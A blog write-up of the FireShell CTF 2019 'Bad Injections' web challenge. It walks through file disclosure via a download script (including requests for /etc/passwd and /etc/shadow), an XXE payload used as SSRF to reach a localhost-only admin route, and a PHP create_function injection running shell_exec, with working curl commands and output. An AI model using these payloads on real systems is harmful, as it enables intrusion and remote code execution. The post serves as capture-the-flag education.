---
title: FireShell CTF 2019 – Bad Injections (WEB)
author: Alevsk
type: post
date: 2019-01-31T05:03:24+00:00
url: /2019/01/fireshell-ctf-2019-bad-injections-web/
categories:
  - Geek
  - Ethical Hacking
  - HTML
  - IT News
  - Personal
  - Talks and Events
  - Programming
  - Technology
  - Tips
  - Tutorials
tags:
  - capture the flag
  - ctf
  - hacking
  - Ethical Hacking

---
Hi everybody, this is the first **CTF** I play this year, it was organized by the [FireShell Security team][1] (thank you so much guys!) and this the writeup for the Bad Injection challenge from the web category.

This challenge was special because I played with some folks from work, special thanks to [yovasx2][2] for playing this CTF with me 🙂

The challenge starts by giving us an IP address running a web server on the Internet:  
**http://68.183.31.62:94**

![](/images/fs0.png)

There is nothing interesting in the website besides a section called **List**, this section displays an image with an interesting URL.

![](/images/fs1.png) 

```html
<div aligned="" center="" class="'ui" container'=""> ![](download?file=files/1.jpg&hash=7e2becd243552b441738ebc6f2d84297) ![](download?file=files/test.txt&hash=293d05cb2ced82858519bdec71a0354b) </div> 
``` 

The resources are loaded using some kind of downloading script, the download script receives two parameters, **file** and **hash**, the hash corresponds to the hashed version of the value of the file parameter.

This looks like a [code disclosure vulnerability][3] so we start by trying to download the **index.php** file: 

```bash
http://68.183.31.62:94/download?file=index.php&hash=828e0013b8f3bc1bb22b4f57172b019d 
```
And the result is: 

```php
ini\_set('display\_errors',1); ini\_set('display\_startup\_erros',1); error\_reporting(E\_ALL); require\_once('Routes.php'); function _\_autoload($class\_name){ if(file\_exists('./classes/'.$class\_name.'.php')){ require\_once './classes/'.$class\_name.'.php'; }else if(file\_exists('./Controllers/'.$class\_name.'.php')){ require\_once './Controllers/'.$class\_name.'.php'; } } 
``` 

In the above code we notice two things, the location in the server were the application “lives" and also the existence of the **Routes.php** file, we proceed to download the file.

```bash
http://68.183.31.62:94/download?file=/app/Routes.php&hash=b1146e09263e0aae856ff66a57968211 
```

The 

**Routes.php** file is huge but there are two route functions that seems interesting

```php
 Route::set('custom',function(){
  $handler = fopen('php://input','r');
  $data = stream_get_contents($handler);
  if(strlen($data) > 1){
    Custom::Test($data);
  } else {
    Custom::createView('Custom');
  } 
});
Route::set('admin',function(){ 
  if(!isset($\_REQUEST['rss']) && !isset($_REQUES['order'])) {
    Admin::createView('Admin');
  } else {
    if($_SERVER['REMOTE_ADDR'] == '127.0.0.1' || $_SERVER['REMOTE_ADDR'] == '::1') {
      Admin::sort($_REQUEST['rss'],$_REQUEST['order']);
    } else {
      echo ";(";
    } 
  }
}); 
``` 

The **custom route** receives some request body and if the length is greater that 1 calls the **Test** function from the **Custom** class.

The **admin route** can receive two parameters, **rss** and **order**, if both exists then a validation happens, the validation checks if the request comes directly from **127.0.0.1** which is **localhost**, if this is true then the **sort** function from the **Admin** class is called.

Here are some other Interesting files I downloaded based on what we learned from the **index.php** file.

```bash
 http://68.183.31.62:94/download?file=/app/Controllers/Custom.php&hash=55fdef99c788af643d2676ac21ada5f4
 http://68.183.31.62:94/download?file=/app/Controllers/Admin.php&hash=42c58ba0a247b5c76bce27387e90b99f
 http://68.183.31.62:94/download?file=/etc/passwd&hash=c5068b7c2b1707f8939b283a2758a691
 http://68.183.31.62:94/download?file=/etc/shadow&hash=2fe8599cb25a0c790213d39b3be97c27
 http://68.183.31.62:94/download?file=/app/Routes.php&hash=b1146e09263e0aae856ff66a57968211 
``` 

We start looking at the **Custom.php** and **Admin.php** controllers, the Custom class looks like this.

```php
 class Custom extends Controller{
  public static function Test($string){
    $root = simplexml_load_string($string,'SimpleXMLElement',LIBXML_NOENT);
    $test = $root->name;
    echo $test;
  }
} 
``` 

The Test method receives an string which then is parsed as an **XML**, the resulting object should contain a name attribute that is printed back to the user. The **Admin** class looks like this.

```php
class Admin extends Controller
{
    public static function sort($url, $order)
    {
        $uri = parse_url($url);
        $file = file_get_contents($url);
        $dom = new DOMDocument();
        $dom->loadXML($file, LIBXML_NOENT | LIBXML_DTDLOAD);
        $xml = simplexml_import_dom($dom);

        if ($xml) {
            $data = [];
            for ($i = 0; $i < count($xml->channel->item); $i++) {
                $data[] = new Url(
                    $i,
                    $uri['scheme'].'://'.$uri['host'].$xml->channel->item[$i]->link
                );
            }

            usort(
                $data,
                create_function(
                    '$a, $b',
                    'return strcmp($a->'.$order.',$b->'.$order.');'
                )
            );

            echo '<div class="ui list">';

            foreach ($data as $dt) {
                $html = '<div class="item">';
                $html .= $dt->id.' – ';
                $html .= '['.$dt->link.']('.$dt->link.')';
                $html .= '</div>';
            }

            $html .= "</div>";
            echo $html;
        } else {
            $html .= "Error, not found XML file!";
            $html .= "<code>";
            $html .= "```Text only\n";
            $html .= $file;
            $html .= "\n```";
            $html .= "</code>";
            echo $html;
        }
    }
}

``` 

That it's! the sort function uses the [create_function][4] method internally, the **create_function** method is very similar to the [eval][5] method, meaning if we can reach that part of the code, essentially we we can achieve [code execution][6] on the server 🙂 now the problem is how to do that since this function can only be called if the request is coming from localhost.

Remember the **Test** function accessible via the **/custom** path? that's our way in! this function receives some input and then parse it as XML, we can take advantage of this vulnerable parser and exploit a vulnerability called [XML External Entity (XXE) Processing][7] which essentially allow us to load remote (or internal) resources.

I'll explain this in the following example, on a command line we start by defining some variables so it's more easy to work.

```bash
 $ url='http://68.183.31.62:94/custom'
 $ xml_content='<?xml version="1.0" ?><!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=https://www.alevsk.com">









]><root><name>&test</name></root>'
 $ curl –request POST –url "$url" –header 'cache-control: no-cache' –header 'content-type: application/xml' –data "$xml_content" | base64 -d 
``` 

In the second line we are defining our XML payload, we are try to load an external resource inside the **DOCTYPE** tag and we are saving the response on a “variable" called test (wrapped by root and name tags), then we are doing a post request to the vulnerable service, if you are wondering why do we need &test that's because our payload will be handled by:

```php
 $root = simplexml_load_string($string,'SimpleXMLElement',LIBXML_NOENT);
 $test = $root->name;
 echo $test; 
``` 

The **simplexml_load_string** is going to process our input and then return an object, that object is expected to have a name attribute which is stored in the $test variable and then printed to the user, we are essentially using this vulnerable service as a **proxy** 🙂

Now, instead of querying [https://www.alevsk.com][8] we are going to do a request to [http://68.183.31.62:94/admin?rss=SOME_URLℴ=PAYLOAD][9] and since the IP address of the server is the same IP of the client making the request (**localhost**) boom! we just bypass the admin validation and now can reach the vulnerable sort function in the **Admin controller**.

Exploiting the **create_function** call was a little bit tricky at the beginning, it required some work crafting the **PHP payload** in a way the final result was valid **php code** without any syntactic error.

According to the [PHP documentation][4], this function receives two string parameters, the first one is the parameters and the second one is the actual code of the function we want to generate. 

The sort function receives two parameters, **$url** and **$order**, we control both of them but the important one is **$order** because it's going to be replaced in the string of the second parameter of the **create_function** function.

After some thinking I came with this idea, I'll explain why.
```bash
 $order = id, null) && die(shell_exec('ls -la /')); ($aaa=" 
``` 

The original piece of code looks like this.
```php
 usort($data, create_function('$a, $b', 'return strcmp($a->'.$order.',$b->'.$order.');')); 
``` 

When I replace the $order variable with my payload the final code looks like this.
```php
 usort($data, create_function('$a, $b', 'return strcmp($a->id, null) && die(shell\_exec(\'ls -la /\')); ($aaa=",$b->id, null) && die(shell_exec(\'ls -la /\')); ($aaa=");')); 
``` 

Maybe I over complicate the things but I remember having some issues with single, double quotes and parentheses, anyway the result is valid **PHP code** :), the **($aaa="** thing at the end is important because it allow us to wrap the rest of the code (everything after shell_exec) into a string variable (like ignoring or skipping the code).

Note: Since I had access to the source code I did several test on my local environment so once I got a working payload I was able to put an exploit together, I needed to encode first the code into the xml before sending the post request.

Putting everything together looks like this.
```bash
 $ url='http://68.183.31.62:94/custom' 
 $ xml_content='<?xml version="1.0" ?><!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=http://localhost/admin?rss=https%3A%2F%2Fwww.website.com%2Fpath%2Fxxe.xml&order=id%2C%20null)%20%26%26%20die(shell\_exec(%27ls%20-la%20%2F%27))%3B%20(%24aaa%3D%22">









]><root><name>&test</name></root>' 
 $ curl –request POST –url "$url" –header 'cache-control: no-cache' –header 'content-type: application/xml' –data "$xml_content" | base64 -d
 
 % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 2197 100 1892 100 305 6348 1023 –:–:– –:–:– –:–:– 7347

 total 116 
 drwxr-xr-x 1 root root 4096 Dec 26 18:10 . 
 drwxr-xr-x 1 root root 4096 Dec 26 18:10 .. 
 -rwxr-xr-x 1 root root 0 Dec 25 23:47 .dockerenv 
 drwxr-xr-x 1 root root 4096 Dec 25 23:50 app 
 drwxr-xr-x 1 root root 4096 Dec 4 15:47 bin 
 drwxr-xr-x 2 root root 4096 Apr 10 2014 boot 
 -rwxr-xr-x 1 root root 1122 Feb 15 2016 create_mysql_admin_user.sh 
 -rw-r–r– 1 root root 31 Dec 26 03:34 da0f72d5d79169971b62a479c34198e7 
 drwxr-xr-x 5 root root 360 Dec 25 23:47 dev 
 drwxr-xr-x 1 root root 4096 Dec 25 23:55 etc 
 drwxr-xr-x 2 root root 4096 Apr 10 2014 home 
 drwxr-xr-x 1 root root 4096 Feb 15 2016 lib 
 drwxr-xr-x 2 root root 4096 Jan 19 2016 lib64 
 drwxr-xr-x 2 root root 4096 Jan 19 2016 media 
 drwxr-xr-x 2 root root 4096 Apr 10 2014 mnt 
 drwxr-xr-x 2 root root 4096 Jan 19 2016 opt 
 dr-xr-xr-x 331 root root 0 Dec 25 23:47 proc 
 drwx—— 1 root root 4096 Dec 26 18:10 root 
 drwxr-xr-x 1 root root 4096 Feb 15 2016 run 
 -rwxr-xr-x 1 root root 549 Feb 15 2016 run.sh 
 drwxr-xr-x 1 root root 4096 Jan 19 2016 sbin 
 drwxr-xr-x 2 root root 4096 Jan 19 2016 srv 
 -rwxr-xr-x 1 root root 67 Feb 15 2016 start-apache2.sh 
 -rwxr-xr-x 1 root root 29 Feb 15 2016 start-mysqld.sh 
 dr-xr-xr-x 13 root root 0 Jan 26 19:06 sys 
 drwxrwxrwt 1 root root 4096 Jan 27 03:30 tmp 
 drwxr-xr-x 1 root root 4096 Feb 15 2016 usr 
 drwxr-xr-x 1 root root 4096 Feb 15 2016 var 
``` 

The flag was inside the **da0f72d5d79169971b62a479c34198e7** file, so we just cat the file and got the flag: **f#{1_d0nt_kn0w_wh4t_i4m_d01ng}**

Happy hacking 🙂

 [1]: https://ctf.fireshellsecurity.team/
 [2]: https://twitter.com/yovasx2
 [3]: https://www.imperva.com/Resources/Glossary/source-code-disclosure
 [4]: http://php.net/manual/es/function.create-function.php
 [5]: http://php.net/manual/en/function.eval.php
 [6]: https://en.wikipedia.org/wiki/Arbitrary_code_execution
 [7]: https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing
 [8]: https://www.alevsk.com/
 [9]: http://68.183.31.62:94/admin